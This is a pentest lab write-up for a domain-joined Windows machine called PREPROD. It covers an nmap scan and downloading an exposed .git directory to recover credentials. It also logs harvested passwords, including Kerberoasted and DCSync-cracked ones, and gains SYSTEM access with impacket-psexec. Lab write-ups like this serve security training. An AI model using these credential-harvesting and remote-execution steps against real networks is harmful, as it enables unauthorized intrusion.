---
description: Domain-connected Windows Machine on Second-Level Internal Network
---

# PREPROD

## Enumeration

Output from `nmap` command run [here](./#nmap):

```
Nmap scan report for vm6.skylark (10.20.111.15)
Host is up (0.040s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: PREPROD Status page
| http-git: 
|   10.20.111.15:80/.git/
|     Git repository found!
|     Repository description: SkylarkPartnerPortal
|     Last commit message: Local Security Violation: Cleartext Credentials in File 
|     Remotes:
|_      http://development:glpat-igxQz9aq3xu6s8_asknQ@cicd.lab.skylark.com/skylark-rd/SkylarkPartnerPortal
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.20.111.15:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-09-02T00:02:51+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.20.111.15:1433: 
|     Target_Name: SKYLARK
|     NetBIOS_Domain_Name: SKYLARK
|     NetBIOS_Computer_Name: PREPROD
|     DNS_Domain_Name: SKYLARK.com
|     DNS_Computer_Name: preprod.SKYLARK.com
|     DNS_Tree_Name: SKYLARK.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-28T21:57:52
|_Not valid after:  2054-07-28T21:57:52
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
18000/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=SKYLARK
|_http-title: Home page - Skylark Partner Portal
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
65307/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.20.111.15:65307: 
|     Target_Name: SKYLARK
|     NetBIOS_Domain_Name: SKYLARK
|     NetBIOS_Computer_Name: PREPROD
|     DNS_Domain_Name: SKYLARK.com
|     DNS_Computer_Name: preprod.SKYLARK.com
|     DNS_Tree_Name: SKYLARK.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-28T21:57:52
|_Not valid after:  2054-07-28T21:57:52
|_ssl-date: 2024-09-02T00:02:51+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.20.111.15:65307: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 65307
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 1.11.X (85%)
OS CPE: cpe:/o:ibm:zos:1.11
Aggressive OS guesses: IBM z/OS 1.11 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-02T00:02:10
|_  start_date: N/A
|_nbstat: NetBIOS name: PREPROD, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:aa:8e (VMware)
```

### Git Enumeration

Before I noticed this machine was domain-connected I started doing some enumeration of the `git` repository that was left exposed on the web server.

The landing page of the web server makes it look like some sort of staging server:

<figure><img src="../../../.gitbook/assets/SL-VM6-80-Landing.png" alt=""><figcaption><p>Landing page on port 80</p></figcaption></figure>

Regardless, `nmap` discovered a `.git` directory on the web server. I download it with `wget`:

```bash
wget --no-parent -r http://vm6.skylark/.git/
```

From here I start using basic `git` enumeration commands:

```bash
git status
```

This works but does not reveal anything useful. I then check the commit history:

```bash
git log
```

The commit message on one of them looks interesting:

<figure><img src="../../../.gitbook/assets/SL-VM6-git-Log.png" alt=""><figcaption><p>Commit history</p></figcaption></figure>

I examine that commit and find 2 sets of credentials in it:

```bash
git show c7922cddb7862f591ef35fd964d5eb48998a4f70
```

<figure><img src="../../../.gitbook/assets/SL-VM6-git-CredentialInCommit.png" alt=""><figcaption><p>SQL credentials in commit</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/SL-VM6-git-CredentialInCommit_1.png" alt=""><figcaption></figcaption></figure>

Several of these seem to be accounts for the web application, but the SQL credentials seem valid since this machine is running `MSSQL` at port `1433`, and they are the credentials in the second (later) commit which mentions security (found above with `git log`).  I file these in `creds.txt`:

{% code title="creds.txt" %}
```
---------------------------------------  DOMAIN CREDENTIALS  ---------------------------------------

SKYLARK\kiosk           XEwUS^9R2Gwt8O914   Found in RDWeb instructions on SINGAPORE06
SKYLARK\backup_service  It4Server           Kerberoasted as kiosk from AUSTIN02
SKYLARK\helpdesk_setup  Tuna6Helper         DCSync to obtain hash and then cracked with hashcat



---------------------------------------  OTHER CREDENTIALS  ----------------------------------------

Administrator   DowntownAbbey1923       SYDNEY08 Local Administrator
Administrator   MusingExtraCounty98     PARIS03 Local Administrator
ftp_jp          ~be<3@6fe1Z:2e8         Honestly not really sure what this is but I found it on PARIS03 in C:\TFTP_SRV\backup.cfg
skylark         User+dcGvfwTbjV[]       Found on LAB in C:\backup\file.txt - Works on web portal on HOUSTON01's port 80
sa              FrogColossusMad1        Found in .git of PREPROD web server - Likely for MSSQL service running on ports 1433 and 65307 of machine
```
{% endcode %}

Before I do any more with them I realized that I probably already had access to this machine with `backup_service`. I went and [sprayed those credentials](./#crackmapexec) across the network and then ...

## Foothold

Initial access is provided as `SYSTEM` by using the `SKYLARK\backup_service` credentials and `impacket-psexec`:

{% code overflow="wrap" %}
```bash
rlwrap impacket-psexec SKYLARK/backup_service:'It4Server'@preprod.skylark.com
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/SL-PRE-SystemPsExec.png" alt=""><figcaption><p>SYSTEM access with impacket-psexec</p></figcaption></figure>

## Post-Exploit

### Manual Enumeration

As I am poking around the C:\ directory I find something potentially interesting in the web root in a file at `C:\inetpub\TODO.txt`:

<figure><img src="../../../.gitbook/assets/SL-PRE-POST-ArchiveCredentials.png" alt=""><figcaption><p>Credentials found in TODO file</p></figcaption></figure>

The note makes mention of [`ARCHIVE`](../subnet-10.10.xxx.0-24/archive.md). Given that machine has been inaccessible thus far, maybe something can be done with these. I also file them in `creds.txt`:

{% code title="creds.txt" %}
```
...
admin           Complex__1__Password!   Found in C:\inetpub\TODO.txt on PREPROD - Note in file mentions ARCHIVE
```
{% endcode %}



